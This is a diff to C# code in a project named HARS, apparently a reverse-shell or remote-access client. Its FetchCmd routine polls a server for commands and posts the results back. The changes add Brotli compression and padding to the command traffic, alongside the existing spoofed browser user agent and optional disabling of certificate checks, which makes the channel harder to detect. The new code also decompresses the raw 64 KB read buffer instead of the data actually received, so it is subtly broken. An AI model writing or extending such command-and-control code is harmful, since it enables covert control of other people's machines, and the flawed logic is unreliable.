@@ -16,6 +16,7 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Web;
 using System.Windows.Forms;
+using BrotliSharpLib;
 
 namespace HARS
 {
@@ -83,9 +84,11 @@ namespace HARS
         // Ask server for instructions
         private bool FetchCmd()
         {
-            String responseString;
             try
             {
+                MemoryStream memoryStream = new MemoryStream(0x10000);
+                byte[] buffer = new byte[0x10000];
+                Byte[] response = null;
                 if (Config.AllowInsecureCertificate)
                     ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
@@ -93,15 +96,19 @@ namespace HARS
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                 req.Headers.Add("Accept-Encoding","gzip, deflate, br");
-                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
-                using (Stream stream = resp.GetResponseStream())
+                using (Stream responseStream = req.GetResponse().GetResponseStream())
                 {
-                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
-                    responseString = reader.ReadToEnd();
+                    int bytes;
+                    while ((bytes = responseStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        memoryStream.Write(buffer, 0, bytes);
+                    }
                 }
-                if (responseString.Length != 0)
+                if (buffer.Length != 0)
                 {
-                    cmd = Utility.Base64Decode(responseString);
+                    byte[] uncompressedResponse = Brotli.DecompressBuffer(buffer, 0, buffer.Length);
+                    cmd = Encoding.ASCII.GetString(uncompressedResponse);
+                    cmd = cmd.Replace("XXPADDINGXXPADDINGXXPADDINGXX", "");
                 }
                 return true;
             }
@@ -125,10 +132,11 @@ namespace HARS
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                 req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
-                byte[] arr = Encoding.ASCII.GetBytes(Utility.Base64Encode(reply));
-                req.ContentLength = arr.Length;
+                Byte[] replyByte = Encoding.ASCII.GetBytes("XXPADDINGXXPADDINGXXPADDINGXX" + reply);
+                byte[] compressedReply = Brotli.CompressBuffer(replyByte, 0, replyByte.Length);
+                req.ContentLength = compressedReply.Length;
                 Stream dataStream = req.GetRequestStream();
-                dataStream.Write(arr, 0, arr.Length);
+                dataStream.Write(compressedReply, 0, compressedReply.Length);
                 HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                 using (Stream stream = resp.GetResponseStream())
                 {
